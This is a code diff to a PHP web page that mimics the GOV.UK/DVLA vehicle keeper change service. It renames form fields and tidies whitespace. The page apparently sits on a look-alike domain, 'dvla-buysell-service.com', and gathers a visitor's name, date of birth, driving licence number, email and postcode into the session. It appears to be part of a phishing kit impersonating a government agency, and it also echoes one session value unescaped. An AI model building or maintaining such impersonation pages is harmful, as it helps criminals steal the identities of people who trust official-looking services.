@@ -4,39 +4,39 @@ session_start();
 
 // Check if the form is submitted
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    // Collect and sanitize form inputs
-    $title = htmlspecialchars($_POST['privatekeeper_title.titleOption']);
-    $otherTitle = htmlspecialchars($_POST['privatekeeper_title.titleText']);
-    $firstName = htmlspecialchars($_POST['privatekeeper_firstname']);
-    $lastName = htmlspecialchars($_POST['privatekeeper_lastname'] );
-    $day = htmlspecialchars($_POST['privatekeeper_dateofbirth.day']);
-    $month = htmlspecialchars($_POST['privatekeeper_dateofbirth.month']);
-    $year = htmlspecialchars($_POST['privatekeeper_dateofbirth.year']);
-    $licenseNumber = htmlspecialchars($_POST['privatekeeper_drivernumber']);
-    $emailConfirmation = htmlspecialchars($_POST['privatekeeper_option_email']);
-    $email = htmlspecialchars($_POST['privatekeeper_email.email']);
-    $emailVerify = htmlspecialchars($_POST['privatekeeper_email.email-verify']);
-    $postcode = htmlspecialchars($_POST['privatekeeper_postcode']);
+   // Collect and sanitize form inputs
+   $title = htmlspecialchars($_POST['privatekeeper_title_titleOption']);
+   $otherTitle = htmlspecialchars($_POST['privatekeeper_title_titleText']);
+   $firstName = htmlspecialchars($_POST['privatekeeper_firstname']);
+   $lastName = htmlspecialchars($_POST['privatekeeper_lastname']);
+   $day = htmlspecialchars($_POST['privatekeeper_dateofbirth.day']);
+   $month = htmlspecialchars($_POST['privatekeeper_dateofbirth.month']);
+   $year = htmlspecialchars($_POST['privatekeeper_dateofbirth.year']);
+   $licenseNumber = htmlspecialchars($_POST['privatekeeper_drivernumber']);
+   $emailConfirmation = htmlspecialchars($_POST['privatekeeper_option_email']);
+   $email = htmlspecialchars($_POST['privatekeeper_email.email']);
+   $emailVerify = htmlspecialchars($_POST['privatekeeper_email.email-verify']);
+   $postcode = htmlspecialchars($_POST['privatekeeper_postcode']);
 
-    
-    $_SESSION['privatekeeper_title.titleOption'] = $_POST['privatekeeper_title.titleOption'];
-    $_SESSION['privatekeeper_title.titleText'] = $_POST['privatekeeper_title.titleText'];
-    $_SESSION['privatekeeper_firstname'] = $_POST['privatekeeper_firstname'];
-    $_SESSION['privatekeeper_lastname'] = $_POST['privatekeeper_lastname'];
-    $_SESSION['privatekeeper_dateofbirth.day'] = $_POST['privatekeeper_dateofbirth.day'];
-    $_SESSION['privatekeeper_dateofbirth.month'] = $_POST['privatekeeper_dateofbirth.month'];
-    $_SESSION['privatekeeper_dateofbirth.year'] = $_POST['privatekeeper_dateofbirth.year'];
-    $_SESSION['privatekeeper_drivernumber'] = $_POST['privatekeeper_drivernumber'];
-    $_SESSION['privatekeeper_option_email'] = $_POST['privatekeeper_option_email'];
-    $_SESSION['privatekeeper_email.email'] = $_POST['privatekeeper_email.email'];
-    $_SESSION['privatekeeper_email.email-verify'] = $_POST['privatekeeper_email.email-verify'];
-    
-    $_SESSION['privatekeeper_postcode'] = $_POST['privatekeeper_postcode'];
-    
+
+   $_SESSION['privatekeeper_title.titleOption'] = $_POST['privatekeeper_title_titleOption'];
+   $_SESSION['privatekeeper_title.titleText'] = $_POST['privatekeeper_title_titleText'];
+   $_SESSION['privatekeeper_firstname'] = $_POST['privatekeeper_firstname'];
+   $_SESSION['privatekeeper_lastname'] = $_POST['privatekeeper_lastname'];
+   $_SESSION['privatekeeper_dateofbirth.day'] = $_POST['privatekeeper_dateofbirth.day'];
+   $_SESSION['privatekeeper_dateofbirth.month'] = $_POST['privatekeeper_dateofbirth.month'];
+   $_SESSION['privatekeeper_dateofbirth.year'] = $_POST['privatekeeper_dateofbirth.year'];
+   $_SESSION['privatekeeper_drivernumber'] = $_POST['privatekeeper_drivernumber'];
+   $_SESSION['privatekeeper_option_email'] = $_POST['privatekeeper_option_email'];
+   $_SESSION['privatekeeper_email.email'] = $_POST['privatekeeper_email.email'];
+   $_SESSION['privatekeeper_email.email-verify'] = $_POST['privatekeeper_email.email-verify'];
+
+   $_SESSION['privatekeeper_postcode'] = $_POST['privatekeeper_postcode'];
+
 }
 
 // Check if the session data exists
-$make = isset($_SESSION['v_make']) ? $_SESSION['v_make'] : 'N/A';
+$make = isset($_SESSION['v_make']) ? $_SESSION['v_make'] : 'N/A'; 
 $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
 ?>
 
@@ -100,7 +100,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                id="logo" aria-label="Go to the GOV.UK homepage" href="#" https:="" www.gov.uk"="">
                <span class="govuk-header__logotype">
                   <!--[if gt IE 8]><!-->
-                 
+
                   <!--<![endif]-->
                   <!-- [if IE 8]> -->
                   <img src="./assets/logo.svg" style="filter: invert(100%);" alt=""
@@ -140,7 +140,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
             <a class="govuk-back-link" id="back"
                href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#">Back</a>
             <script>
-               document.getElementById('back').addEventListener('click', function () {
+               document.getElementById('back').addEventListener('click', function() {
                   history.back();
                });
             </script>
@@ -157,14 +157,14 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                            <dl>
                               <dt>Registration number</dt>
                               <dd>
-                                 <span class="reg-number"><?php echo $_SESSION['v_registration'];?></span>
+                                 <span class="reg-number"><?php echo $_SESSION['v_registration']; ?></span>
                               </dd>
                               <dt>Make</dt>
                               <dd><?php echo htmlspecialchars($make); ?></dd>
                               <dt>Model</dt>
                               <dd><?php echo htmlspecialchars($model); ?></dd>
                            </dl>
-                        
+
                         </div>
                         <div style="font-weight:bold;" class="govuk-warning-text">
                            <span class="govuk-warning-text__icon" aria-hidden="true">!</span>
@@ -195,7 +195,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                              <div class="govuk-radios__item">
                                                 <input class="govuk-radios__input form-radio selectable" type="radio"
                                                    id="privatekeeper_title_titleOption_1"
-                                                   name="privatekeeper_title.titleOption" value="Mr" showerrors="false"
+                                                   name="privatekeeper_title_titleOption" value="Mr" showerrors="false"
                                                    data-gtm-form-interact-field-id="0" required="">
                                                 <label class="govuk-label govuk-radios__label"
                                                    for="privatekeeper_title_titleOption_1">
@@ -205,7 +205,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                              <div class="govuk-radios__item">
                                                 <input class="govuk-radios__input form-radio selectable" type="radio"
                                                    id="privatekeeper_title_titleOption_2"
-                                                   name="privatekeeper_title.titleOption" value="Mrs" showerrors="false"
+                                                   name="privatekeeper_title_titleOption" value="Mrs" showerrors="false"
                                                    required="">
                                                 <label class="govuk-label govuk-radios__label"
                                                    for="privatekeeper_title_titleOption_2">
@@ -215,7 +215,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                              <div class="govuk-radios__item">
                                                 <input class="govuk-radios__input form-radio selectable" type="radio"
                                                    id="privatekeeper_title_titleOption_3"
-                                                   name="privatekeeper_title.titleOption" value="Miss"
+                                                   name="privatekeeper_title_titleOption" value="Miss"
                                                    showerrors="false" required="">
                                                 <label class="govuk-label govuk-radios__label"
                                                    for="privatekeeper_title_titleOption_3">
@@ -225,7 +225,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                              <div class="govuk-radios__item">
                                                 <input class="govuk-radios__input form-radio selectable" type="radio"
                                                    id="privatekeeper_title_titleOption_4"
-                                                   name="privatekeeper_title.titleOption" value="" showerrors="false"
+                                                   name="privatekeeper_title_titleOption" value="" showerrors="false"
                                                    required="">
                                                 <label class="govuk-label govuk-radios__label"
                                                    for="privatekeeper_title_titleOption_4">
@@ -245,7 +245,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                     <span class="form-hint" id="privatekeeper_title_titleText-hint">(10 characters
                                        maximum)</span>
                                     <input class="govuk-input" id="privatekeeper_title_titleText"
-                                       name="privatekeeper_title.titleText" value="" type="text" maxlength="10"
+                                       name="privatekeeper_title_titleText" value="" type="text" maxlength="10"
                                        autocomplete="off" aria-describedby="privatekeeper_title_titleText-hint">
                                  </div>
                                  <span class="form-hint"></span>
@@ -355,7 +355,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                                       Email address of new keeper
                                                    </label>
                                                    <input class="govuk-input" id="privatekeeper_email_email"
-                                                      name="privatekeeper_email.email" value="" type="text"
+                                                      name="privatekeeper_email_email" value="" type="text"
                                                       no_optional_label="true" maxlength="254" autocomplete="off">
                                                 </div>
                                                 <div class="form-item">
@@ -388,7 +388,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                            </div>
                         </div>
                         <script>
-                           document.addEventListener('DOMContentLoaded', function () {
+                           document.addEventListener('DOMContentLoaded', function() {
                               var yesRadio = document.getElementById('privatekeeper_option_email_visible');
                               var noRadio = document.getElementById('privatekeeper_option_email_invisible');
                               var conditionalContainer = document.getElementById('conditional-privatekeeper_option_email');
@@ -396,7 +396,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                               // Check if the radio buttons and container exist
                               if (yesRadio && noRadio && conditionalContainer) {
                                  // Add an event listener to the "Yes" radio button
-                                 yesRadio.addEventListener('change', function () {
+                                 yesRadio.addEventListener('change', function() {
                                     // Check if the "Yes" radio button is checked
                                     if (yesRadio.checked) {
                                        // Display the conditional container
@@ -408,7 +408,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                                  });
 
                                  // Add an event listener to the "No" radio button
-                                 noRadio.addEventListener('change', function () {
+                                 noRadio.addEventListener('change', function() {
                                     // Check if the "No" radio button is checked
                                     if (noRadio.checked) {
                                        // Hide the conditional container
@@ -434,7 +434,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                   </div>
                   <div class="form-item">
                      <input onclick="getAddresses()" class="govuk-button" id="mileage" style="font-size: 18px;" name="step-4" value="Continue"
-                        type="submit" autocomplete="off" maxlength="6" >
+                        type="submit" autocomplete="off" maxlength="6">
                   </div>
                </form>
             </div>
@@ -454,7 +454,7 @@ $model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';
                      <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                         data-track-label="/help" data-track-options="{&quot;dimension29&quot;:&quot;Help&quot;}"
                         data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
-                        href="#" https:="" www.gov.uk="" >Help</a>
+                        href="#" https:="" www.gov.uk="">Help</a>
                   </li>
                   <li class="govuk-footer__inline-list-item">
                      <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
